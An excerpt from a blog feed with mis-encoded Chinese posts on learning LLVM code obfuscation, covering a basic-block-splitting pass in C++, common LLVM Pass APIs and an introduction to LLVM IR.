class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ä¸ºä»€ä¹ˆè¦å…ˆæŠŠæ‰€æœ‰åŸºæœ¬å—ä¿å­˜åˆ° vector å®¹å™¨ä¸­</p><p>å› ä¸ºè¦å¯¹åŸºæœ¬å—è¿›è¡Œåˆ†å‰²æ“ä½œï¼Œåˆ†å‰²æ—¶åŸºæœ¬å—æ•°é‡ä¼šå¢å¤šï¼Œæ‰€ä»¥éœ€è¦æŠŠåŸå…ˆæ‰€æœ‰åŸºæœ¬å—ä¿å­˜åˆ°ä¸€ä¸ª vector å®¹å™¨ä¸­ï¼Œåœ¨å®¹å™¨ä¸­è¿›è¡Œåˆ†è£‚æ“ä½œä¸ä¼šå½±å“ foreach éå†</p></blockquote><p><code>containsPHI</code>å‡½æ•°å®ç°ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SplitBasicBlock::containsPHI</span><span class="params">(BasicBlock *BB)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(Instruction &amp;I : *BB)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;PHINode&gt;(&amp;I))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>split</code>å‡½æ•°å®ç°ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">SplitBasicBlock::split</span><span class="params">(BasicBlock *BB)</span></span>&#123;</span><br><span class="line">    <span class="comment">// è®¡ç®—åˆ†è£‚åæ¯ä¸ªåŸºæœ¬å—çš„å¤§å°</span></span><br><span class="line">    <span class="comment">// åŸåŸºæœ¬å—çš„å¤§å° / åˆ†è£‚æ•°ç›®ï¼ˆå‘ä¸Šå–æ•´ï¼‰</span></span><br><span class="line">    <span class="type">int</span> splitSize = (BB-&gt;<span class="built_in">size</span>() + splitNum - <span class="number">1</span>) / splitNum;</span><br><span class="line">    BasicBlock *curBB = BB;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt; splitNum;i++)&#123;</span><br><span class="line">        <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(Instruction &amp;I : *curBB)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cnt++ == splitSize)&#123;</span><br><span class="line">                <span class="comment">// åœ¨ I æŒ‡ä»¤å¤„å¯¹åŸºæœ¬å—è¿›è¡Œåˆ†å‰²</span></span><br><span class="line">                curBB = curBB-&gt;<span class="built_in">splitBasicBlock</span>(&amp;I);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆå§‹åŒ– ID å¹¶æ³¨å†Œï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> SplitBasicBlock::ID = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;SplitBasicBlock&gt; <span class="title">x</span><span class="params">(<span class="string">&quot;split&quot;</span>, <span class="string">&quot;Split a basic block into multiple basic blocks.&quot;</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>å®Œæ•´ä»£ç ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Instructions.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/CommandLine.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../include/SplitBasicBlock.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::vector;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯é€‰çš„å‚æ•°ï¼ŒæŒ‡å®šä¸€ä¸ªåŸºæœ¬å—ä¼šè¢«åˆ†è£‚æˆå‡ ä¸ªåŸºæœ¬å—ï¼Œé»˜è®¤å€¼ä¸º 2</span></span><br><span class="line"><span class="function"><span class="type">static</span> cl::opt&lt;<span class="type">int</span>&gt; <span class="title">splitNum</span><span class="params">(<span class="string">&quot;split_num&quot;</span>, cl::init(<span class="number">2</span>), cl::desc(<span class="string">&quot;Split&lt;split_num&gt; time(s) each BB&quot;</span>))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">SplitBasicBlock</span> : <span class="keyword">public</span> FunctionPass&#123;</span><br><span class="line">        <span class="keyword">public</span>:</span><br><span class="line">            <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">            <span class="built_in">SplitBasicBlock</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span></span>;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="type">bool</span> <span class="title">containsPHI</span><span class="params">(BasicBlock *BB)</span></span>;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="type">void</span> <span class="title">split</span><span class="params">(BasicBlock *BB)</span></span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; <span class="comment">// namespace</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// runOnFunctionå‡½æ•°å®ç°</span></span><br><span class="line"><span class="type">bool</span> SplitBasicBlock :: <span class="built_in">runOnFunction</span>(Function &amp;F)&#123;</span><br><span class="line">    vector&lt;BasicBlock*&gt; origBB;</span><br><span class="line">    <span class="keyword">for</span>(BasicBlock &amp;BB : F)&#123;</span><br><span class="line">        origBB.<span class="built_in">push_back</span>(&amp;BB);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(BasicBlock *BB : origBB)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">containsPHI</span>(BB))&#123;</span><br><span class="line">            <span class="built_in">split</span>(BB);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SplitBasicBlock::containsPHI</span><span class="params">(BasicBlock *BB)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(Instruction &amp;I : *BB)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isa</span>&lt;PHINode&gt;(&amp;I))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SplitBasicBlock::split</span><span class="params">(BasicBlock *BB)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> splitSize = (BB-&gt;<span class="built_in">size</span>() + splitNum - <span class="number">1</span>) / splitNum;</span><br><span class="line">    BasicBlock *curBB = BB;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>;i &lt; splitNum; i++)&#123;</span><br><span class="line">        <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(Instruction &amp;I : *curBB)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cnt++ == splitSize)&#123;</span><br><span class="line">                curBB = curBB-&gt;<span class="built_in">splitBasicBlock</span>(&amp;I);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">FunctionPass* <span class="title">createSplitBasicBlockPass</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">SplitBasicBlock</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> SplitBasicBlock :: ID = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// æ³¨å†Œè¯¥ SplitBasicBlock Pass</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;SplitBasicBlock&gt; <span class="title">x</span><span class="params">(<span class="string">&quot;split&quot;</span>, <span class="string">&quot;Split a basic block into multiple basic blocks.&quot;</span>)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="SplitBasicBlock-h"><a href="#SplitBasicBlock-h" class="headerlink" title="SplitBasicBlock.h"></a>SplitBasicBlock.h</h3><p>åœ¨ llvm å‘½åç©ºé—´é‡Œæ·»åŠ ä¸€ä¸ªå‡½æ•°<code>FunctionPass* createSplitBasicBlockPass()</code></p><p>è¿™ä¸ªå‡½æ•°å°†åœ¨<code>SplitBasicBlock.cpp</code>é‡Œå®ç°</p><p>è¿™æ ·çš„è¯å…¶ä»– LLVM Pass å°±å¯ä»¥é€šè¿‡å¼•å…¥å¤´æ–‡ä»¶<code>SplicBasicBlock.h</code>è°ƒç”¨<code>createSplitBasicBlockPass</code>å‡½æ•°æ¥åˆ›å»ºä¸€ä¸ª<code>SplitBasicBlock</code>Passï¼Œå®ŒæˆåŸºæœ¬å—çš„åˆ†å‰²</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> llvm&#123;</span><br><span class="line">    <span class="function">FunctionPass* <span class="title">createSplitBasicBlockPass</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>SplitBasicBlock.cpp</code>ä¸­å®ç°<code>llvm::createSplitBasicBlock</code>å‡½æ•°ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FunctionPass* <span class="title">llvm::createSplitBasicBlockPass</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">SplitBasicBlock</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®Œæ•´ä»£ç ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _SPLIT_BASIC_BLOCK_H_<span class="comment">// é˜²æ­¢é‡å¤å¯¼å…¥å¤´æ–‡ä»¶</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _SPLIT_BASIC_BLOCK_H_</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="keyword">namespace</span> llvm</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">FunctionPass* <span class="title">createSplitBasicBlockPass</span><span class="params">()</span></span>;</span><br><span class="line">&#125; <span class="comment">// namespace llvm</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> hackæŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç æ··æ·† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>llvmä»£ç æ··æ·†å­¦ä¹ ï¼ˆäºŒï¼‰</title>
      <link href="/posts/17054/"/>
      <url>/posts/17054/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢</p><p>éšä¾¿å­¦å­¦ llvm ä»£ç æ··æ·†ï¼Œé¡ºä¾¿åšä¸ªæ¯•è®¾ï¼Œæ°´å‡ ç¯‡æ–‡ç« å°±å½“åšåšç¬”è®°</p></blockquote><h1 id="LLVM-Pass-å¸¸ç”¨-API"><a href="#LLVM-Pass-å¸¸ç”¨-API" class="headerlink" title="LLVM Pass å¸¸ç”¨ API"></a>LLVM Pass å¸¸ç”¨ API</h1><p>LLVM Pass æ¡†æ¶ä¸­ï¼Œä¸‰ä¸ªæœ€æ ¸å¿ƒçš„ç±»æ˜¯ <code>Function</code>ã€<code>BasicBlock</code>å’Œ<code>Instruction</code>ï¼Œåˆ†åˆ«å¯¹åº” LLVM IR ä¸­çš„å‡½æ•°ã€åŸºæœ¬å—å’ŒæŒ‡ä»¤ï¼Œè¿˜æœ‰ä¸€ä¸ªåŸºæœ¬ç±»<code>Value</code>ï¼Œæ‰€æœ‰å¯ä»¥è¢«å½“ä½œæŒ‡ä»¤æ“ä½œæ•°çš„ç±»å‹éƒ½æ˜¯ <code>Value</code> çš„å­ç±»</p><h2 id="Function-ç±»"><a href="#Function-ç±»" class="headerlink" title="Function ç±»"></a>Function ç±»</h2><p>ä¸ Function æœ‰å…³çš„æ“ä½œä¸»è¦æ˜¯è·å–å‡½æ•°çš„ä¸€äº›å±æ€§ï¼Œæ¯”å¦‚åç§°ç­‰ç­‰ï¼Œä»¥åŠå¯¹å‡½æ•°ä¸­åŸºæœ¬å—çš„éå†ï¼š</p><ul><li>è·å–å‡½æ•°åç§°ï¼šF.getName()</li><li>è·å–å…¥å£å¿«ï¼šF.getEntryBlock()</li><li>å‡½æ•°ä¸­åŸºæœ¬å—çš„éå†</li></ul><p>å¯ä»¥é€šè¿‡ foreach å¾ªç¯å¯¹å‡½æ•° Function ä¸­çš„æ¯ä¸ªåŸºæœ¬å— BasicBlock è¿›è¡Œéå†</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span></span>&#123;<span class="comment">// ä½¿ç”¨å¼•ç”¨æ˜¯ä¸ºäº†èƒ½ä¿®æ”¹ä¼ å…¥å‚æ•°Functionç±»</span></span><br><span class="line">    <span class="keyword">for</span>(BasicBlock &amp;BB : F)&#123;<span class="comment">// éå†Fä¸­çš„åŸºæœ¬å—ï¼ŒåŒæ ·ä½¿ç”¨å¼•ç”¨</span></span><br><span class="line">        <span class="comment">// to do</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="BasicBlock-ç±»"><a href="#BasicBlock-ç±»" class="headerlink" title="BasicBlock ç±»"></a>BasicBlock ç±»</h2><p>ä¸ BasicBlcok æœ‰å…³çš„æ“ä½œä¸»è¦æ˜¯åŸºæœ¬å—çš„å…‹éš†ã€åˆ†è£‚ã€ç§»åŠ¨ç­‰ï¼Œä»¥åŠå¯¹åŸºæœ¬å—ä¸­æŒ‡ä»¤çš„éå†ï¼š</p><ul><li>è·å–åŸºæœ¬å—åç§°ï¼šBB.getName()</li><li>è·å–åŸºæœ¬å—çš„ç»ˆç»“æŒ‡ä»¤ï¼šBB.getTerminator()</li><li>åŸºæœ¬å—çš„å…‹éš†</li><li>åŸºæœ¬å—çš„åˆ†è£‚</li><li>åŸºæœ¬å—çš„ç§»åŠ¨</li><li>åŸºæœ¬å—ä¸­æŒ‡ä»¤çš„éå†</li></ul><p>å¯ä»¥é€šè¿‡ foreach å¾ªç¯å¯¹åŸºæœ¬å— BasickBlock ä¸­çš„æ¯ä¸ªæŒ‡ä»¤ Instruction è¿›è¡Œéå†</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span></span>&#123;<span class="comment">// ä½¿ç”¨å¼•ç”¨æ˜¯ä¸ºäº†èƒ½ä¿®æ”¹ä¼ å…¥å‚æ•°Functionç±»</span></span><br><span class="line">    <span class="keyword">for</span>(BasicBlock &amp;BB : F)&#123;<span class="comment">// éå†Fä¸­çš„åŸºæœ¬å—ï¼ŒåŒæ ·ä½¿ç”¨å¼•ç”¨</span></span><br><span class="line">        <span class="keyword">for</span>(Instruction &amp;I : BB)&#123;<span class="comment">// éå†BBä¸­çš„æŒ‡ä»¤ï¼ŒåŒæ ·ä½¿ç”¨å¼•ç”¨</span></span><br><span class="line">            <span class="comment">// to do</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Instruction-ç±»"><a href="#Instruction-ç±»" class="headerlink" title="Instruction ç±»"></a>Instruction ç±»</h2><p>æŒ‡ä»¤å¯ä»¥æœ‰å¾ˆå¤šç§ï¼Œäº¦å³ Instruction ç±»å¯ä»¥æ‹¥æœ‰å¤šä¸ªå­ç±»ï¼Œå¦‚ï¼šBinaryOpterator, AllocaInst, BranchInst ç­‰</p><ul><li>äºŒå…ƒè¿ç®—ï¼šBinaryOperator</li><li>å†…å­˜è®¿é—®å’Œå¯»å€ï¼š<ul><li>Allocalnst</li><li>StoreInst</li><li>LoadInst</li></ul></li><li>åˆ†æ”¯æŒ‡ä»¤ï¼š<ul><li>Branchlnst</li><li>Switchlnst</li></ul></li><li>å…¶ä»–æŒ‡ä»¤<ul><li>Calllnst</li><li>ICmplnst</li><li>PHINode</li></ul></li></ul><p>ä¸ Instruction æœ‰å…³çš„æ“ä½œä¸»è¦æ˜¯æŒ‡ä»¤çš„åˆ›å»ºã€åˆ é™¤ã€ä¿®æ”¹ä»¥åŠæŒ‡ä»¤ä¸­æ“ä½œæ•°çš„éå†ï¼š</p><p>å¯ä»¥é€šè¿‡ for å¾ªç¯å¯¹æŒ‡ä»¤ Instruction ä¸­çš„æ¯ä¸ªæ“ä½œæ•° Value* è¿›è¡Œéå†</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span></span>&#123;<span class="comment">// ä½¿ç”¨å¼•ç”¨æ˜¯ä¸ºäº†èƒ½ä¿®æ”¹ä¼ å…¥å‚æ•°Functionç±»</span></span><br><span class="line">    <span class="keyword">for</span>(BasicBlock &amp;BB : F)&#123;<span class="comment">// éå†Fä¸­çš„åŸºæœ¬å—ï¼ŒåŒæ ·ä½¿ç”¨å¼•ç”¨</span></span><br><span class="line">        <span class="keyword">for</span>(Instruction &amp;I : BB)&#123;<span class="comment">// éå†BBä¸­çš„æŒ‡ä»¤ï¼ŒåŒæ ·ä½¿ç”¨å¼•ç”¨</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; I.<span class="built_in">getNumOperands</span>(); i++)&#123;</span><br><span class="line">                Value *V = I.<span class="built_in">getOperand</span>(i);</span><br><span class="line">                <span class="comment">// to do</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Value-ç±»"><a href="#Value-ç±»" class="headerlink" title="Value ç±»"></a>Value ç±»</h2><p>æ‰€æœ‰å¯ä»¥è¢«å½“åš<strong>æŒ‡ä»¤æ“ä½œæ•°</strong>çš„ç±»å‹éƒ½æ˜¯ Value çš„å­ç±»ï¼ŒValue æœ‰ä»¥ä¸‹äº”ç§ç±»å‹çš„å­ç±»</p><ul><li>å¸¸é‡ï¼šConstant</li><li>å‚æ•°ï¼šArgument</li><li>æŒ‡ä»¤ï¼ˆè¿ç®—ç»“æœï¼‰ï¼šInstruction</li><li>å‡½æ•°ï¼ˆæŒ‡é’ˆï¼‰ï¼šFunction</li><li>åŸºæœ¬å—ï¼šBasicBlock</li></ul><h2 id="è¾“å‡ºæµ"><a href="#è¾“å‡ºæµ" class="headerlink" title="è¾“å‡ºæµ"></a>è¾“å‡ºæµ</h2><p>åœ¨ C++ ä¸­å¯ä»¥é€šè¿‡ cout, cerr, clog è¾“å‡ºæµæ¥è¿›è¡Œæ‰“å°ï¼Œåœ¨ LLVM ä¸­åˆ™å»ºè®®ä½¿ç”¨ outs(), errs(), dbgs() ä¸‰ä¸ªå‡½æ•°æ¥è·å–è¾“å‡ºæµï¼Œç„¶åæ‰“å°</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span></span>&#123;</span><br><span class="line"><span class="comment">// ä¸€èˆ¬ä¿¡æ¯æ‰“å°</span></span><br><span class="line">    <span class="built_in">outs</span>() &lt;&lt; <span class="string">&quot;Function: &quot;</span> &lt;&lt; F.<span class="built_in">getName</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="comment">// é”™è¯¯ä¿¡æ¯æ‰“å° if something wrong</span></span><br><span class="line">    <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Something wrong.&quot;</span> &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="comment">// è°ƒè¯•ä¿¡æ¯æ‰“å° debug</span></span><br><span class="line">    <span class="built_in">dbgs</span>() &lt;&lt; <span class="string">&quot;Debug&quot;</span> &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="LLVM-éƒ¨åˆ†ç›¸å…³æ–‡æ¡£"><a href="#LLVM-éƒ¨åˆ†ç›¸å…³æ–‡æ¡£" class="headerlink" title="LLVM éƒ¨åˆ†ç›¸å…³æ–‡æ¡£"></a>LLVM éƒ¨åˆ†ç›¸å…³æ–‡æ¡£</h1><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230208005218987.png" alt="image-20230208005218987"></p>]]></content>
      
      
      <categories>
          
          <category> hackæŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç æ··æ·† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šæ½œæ°´å‘˜æˆ´å¤«ã€‹æ¸¸æˆæµ‹è¯„</title>
      <link href="/posts/34623/"/>
      <url>/posts/34623/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>llvmä»£ç æ··æ·†å­¦ä¹ ï¼ˆä¸€ï¼‰</title>
      <link href="/posts/53988/"/>
      <url>/posts/53988/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢</p><p>éšä¾¿å­¦å­¦ llvm ä»£ç æ··æ·†ï¼Œé¡ºä¾¿åšä¸ªæ¯•è®¾ï¼Œæ°´å‡ ç¯‡æ–‡ç« å°±å½“åšåšç¬”è®°</p></blockquote><h1 id="LLVM-IR-æ¦‚è¿°"><a href="#LLVM-IR-æ¦‚è¿°" class="headerlink" title="LLVM IR æ¦‚è¿°"></a>LLVM IR æ¦‚è¿°</h1><ul><li>ä½çº§ç¼–ç¨‹è¯­è¨€ï¼Œç±»ä¼¼æ±‡ç¼–</li><li>ä»»ä½•é«˜çº§ç¼–ç¨‹è¯­è¨€éƒ½å¯ä»¥ç”¨ LLVM IR è¡¨ç¤º</li><li>åŸºäº LLVM IR å¯ä»¥è¿›è¡Œä»£ç ä¼˜åŒ–</li></ul><h2 id="ä¸¤ç§è¡¨ç¤ºæ–¹æ³•"><a href="#ä¸¤ç§è¡¨ç¤ºæ–¹æ³•" class="headerlink" title="ä¸¤ç§è¡¨ç¤ºæ–¹æ³•"></a>ä¸¤ç§è¡¨ç¤ºæ–¹æ³•</h2><ul><li>äººç±»å¯ä»¥é˜…è¯»çš„æ–‡æœ¬å½¢å¼ï¼Œæ–‡ä»¶åç¼€ä¸º<code>.ll</code></li><li>æ˜“äºæœºå™¨å¤„ç†çš„äºŒè¿›åˆ¶æ ¼å¼ï¼Œæ–‡ä»¶åç¼€ä¸º<code>.bc</code></li></ul><p>ç”¨<code>llvm-dis</code>å’Œ<code>llvm-as</code>å¯ä»¥ç›¸äº’è½¬åŒ–</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230206231754258.png" alt="image-20230206231754258"></p><h2 id="ç»“æ„"><a href="#ç»“æ„" class="headerlink" title="ç»“æ„"></a>ç»“æ„</h2><p>æºä»£ç è¢«ç¼–è¯‘ä¸º LLVM IR åï¼Œå…·æœ‰<code>æ¨¡å— Module</code>ï¼Œ<code>å‡½æ•° Function</code>å’Œ<code>åŸºæœ¬å— BasicBlock</code></p><h3 id="æ¨¡å—"><a href="#æ¨¡å—" class="headerlink" title="æ¨¡å—"></a>æ¨¡å—</h3><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230206232105298.png" alt="image-20230206232105298"></p><ul><li>ä¸€ä¸ªæºä»£ç æ–‡ä»¶å¯¹åº”ä¸€ä¸ªæ¨¡å—</li><li>å¤´éƒ¨ä¿¡æ¯åŒ…å«ç¨‹åºçš„ç›®æ ‡å¹³å°ï¼Œå¦‚ x86ã€arm ç­‰ï¼Œå’Œä¸€äº›å…¶ä»–ä¿¡æ¯</li><li>å…¨å±€ç¬¦å·åŒ…å«<strong>å…¨å±€å˜é‡ã€å‡½æ•°çš„å®šä¹‰ä¸å£°æ˜</strong></li></ul><h3 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h3><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230206232217964.png" 